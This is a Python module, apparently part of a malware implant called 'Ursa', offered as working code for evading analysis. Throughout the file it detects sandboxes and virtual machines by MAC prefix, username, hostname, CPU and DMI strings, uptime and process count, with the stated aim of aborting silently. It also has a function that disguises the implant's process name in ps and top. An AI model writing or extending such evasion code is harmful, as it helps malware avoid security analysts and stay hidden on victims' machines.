"""Sandbox and VM detection for the Ursa implant.

Checks multiple environmental signals to decide whether the implant is
running inside an analysis environment (sandbox, VM, AV emulator).
If enough signals fire, the implant should abort silently.

Usage:
    from implants.evasion import is_sandbox, sandbox_checks

    if is_sandbox():
        raise SystemExit(0)   # or just return quietly
"""

import os
import platform
import re
import socket
import subprocess
import sys

# ── Indicator databases ────────────────────────────────────────────────────────

# VMware, ESX, VirtualBox, QEMU/KVM, Xen, Parallels, Hyper-V
_VM_MAC_OUIS: frozenset[str] = frozenset({
    "00:0c:29",  # VMware Workstation
    "00:50:56",  # VMware ESX
    "00:05:69",  # VMware (legacy)
    "08:00:27",  # VirtualBox
    "52:54:00",  # QEMU/KVM
    "00:16:3e",  # Xen
    "00:1c:42",  # Parallels
    "00:03:ff",  # Hyper-V
    "00:15:5d",  # Hyper-V (alternate)
})

# Usernames that commonly appear in sandbox/analysis VMs
_SANDBOX_USERS: frozenset[str] = frozenset({
    "sandbox", "malware", "virus", "sample", "cuckoo",
    "norman", "nepenthes", "cwsandbox", "joebox",
    "john", "joe", "av", "avtest", "analyst", "analysis",
    "vmware", "vbox", "test", "user",
})

# CPU/hypervisor vendor strings found in /proc/cpuinfo
_VM_CPU_STRINGS: tuple[str, ...] = (
    "hypervisor", "vmware", "virtualbox", "qemu", "kvm", "xen",
    "bochs", "vbox",
)

# Hostname patterns common in auto-provisioned sandboxes
_SANDBOX_HOST_RE = re.compile(
    r"^(sandbox|malware|cuckoo|analysis|"
    r"win-[a-z0-9]{6,}|desktop-[a-z0-9]{6,}|"
    r"vm-\d+|vbox|vmware)",
    re.IGNORECASE,
)


# ── Individual check functions ─────────────────────────────────────────────────

def _uptime_seconds() -> float:
    """Return system uptime in seconds; 9999 if unknown."""
    try:
        if platform.system() == "Linux":
            with open("/proc/uptime") as f:
                return float(f.read().split()[0])
        # macOS
        out = subprocess.run(
            ["sysctl", "-n", "kern.boottime"],
            capture_output=True, text=True, timeout=3,
        )
        m = re.search(r"sec\s*=\s*(\d+)", out.stdout)
        if m:
            import time
            return time.time() - int(m.group(1))
    except Exception:
        pass
    return 9999.0


def _mac_ouis() -> set[str]:
    """Return lowercase MAC OUI prefixes for all network interfaces."""
    ouis: set[str] = set()
    try:
        import uuid
        mac = uuid.getnode()
        oui = ":".join(f"{(mac >> (8 * (5 - i))) & 0xff:02x}" for i in range(3))
        ouis.add(oui.lower())
    except Exception:
        pass
    return ouis


def _cpu_has_vm_string() -> bool:
    """Return True if /proc/cpuinfo mentions a hypervisor or VM vendor."""
    try:
        with open("/proc/cpuinfo") as f:
            cpuinfo = f.read().lower()
        return any(s in cpuinfo for s in _VM_CPU_STRINGS)
    except Exception:
        return False


def _process_count() -> int:
    """Approximate number of running processes."""
    try:
        if platform.system() == "Linux":
            # Each numeric /proc entry is a PID
            return sum(1 for e in os.scandir("/proc") if e.name.isdigit())
        # macOS / other
        out = subprocess.run(
            ["ps", "ax"], capture_output=True, text=True, timeout=5,
        )
        return max(0, len(out.stdout.splitlines()) - 1)  # strip header
    except Exception:
        return 9999


def _dmi_has_vm_string() -> bool:
    """Check DMI/SMBIOS product name for VM indicators (Linux only)."""
    dmi_paths = [
        "/sys/class/dmi/id/product_name",
        "/sys/class/dmi/id/sys_vendor",
        "/sys/class/dmi/id/board_vendor",
    ]
    vm_strings = ("vmware", "virtualbox", "qemu", "kvm", "xen",
                  "bochs", "innotek", "parallels", "microsoft corporation")
    for path in dmi_paths:
        try:
            with open(path) as f:
                val = f.read().lower()
            if any(s in val for s in vm_strings):
                return True
        except Exception:
            pass
    return False


# ── Public API ─────────────────────────────────────────────────────────────────

def sandbox_checks() -> dict[str, bool]:
    """Run all sandbox/VM detection checks.

    Returns a dict mapping check-name → bool (True = indicator present).
    """
    username = (os.getenv("USER") or os.getenv("USERNAME") or "").lower()
    hostname = socket.gethostname()
    uptime = _uptime_seconds()
    proc_count = _process_count()
    ouis = _mac_ouis()

    return {
        "low_uptime":         uptime < 300,                          # < 5 min
        "sandbox_user":       username in _SANDBOX_USERS,
        "sandbox_hostname":   bool(_SANDBOX_HOST_RE.match(hostname)),
        "vm_mac_oui":         bool(ouis & _VM_MAC_OUIS),
        "vm_cpu_string":      _cpu_has_vm_string(),
        "vm_dmi_string":      _dmi_has_vm_string(),
        "low_process_count":  proc_count < 30,
    }


def is_sandbox(min_hits: int = 2) -> bool:
    """Return True if at least `min_hits` sandbox indicators are detected.

    Defaults to 2 to avoid false-positives from any single coincidental match.
    Set min_hits=1 for maximum sensitivity.
    """
    checks = sandbox_checks()
    return sum(1 for v in checks.values() if v) >= min_hits


def spoof_process_name(name: str) -> bool:
    """Attempt to change the visible process name in ps/top/htop.

    Strategy (in priority order):
      1. setproctitle library — changes full cmdline in ps aux (best)
      2. ctypes prctl PR_SET_NAME — changes 15-char thread name on Linux
      3. sys.argv[0] mutation — minimal effect, last resort

    Returns True if at least one method succeeded.
    """
    success = False

    # Method 1: setproctitle (pip install setproctitle)
    try:
        import setproctitle as _spt
        _spt.setproctitle(name)
        success = True
    except ImportError:
        pass

    # Method 2: prctl PR_SET_NAME (Linux, stdlib ctypes, max 15 chars)
    if platform.system() == "Linux":
        try:
            import ctypes
            PR_SET_NAME = 15
            name_bytes = name[:15].encode() + b"\x00"
            ret = ctypes.cdll.LoadLibrary("libc.so.6").prctl(
                PR_SET_NAME, name_bytes, 0, 0, 0
            )
            if ret == 0:
                success = True
        except Exception:
            pass

    # Method 3: argv[0] — changes what some tools display (fallback)
    try:
        sys.argv[0] = name
        success = True
    except Exception:
        pass

    return success
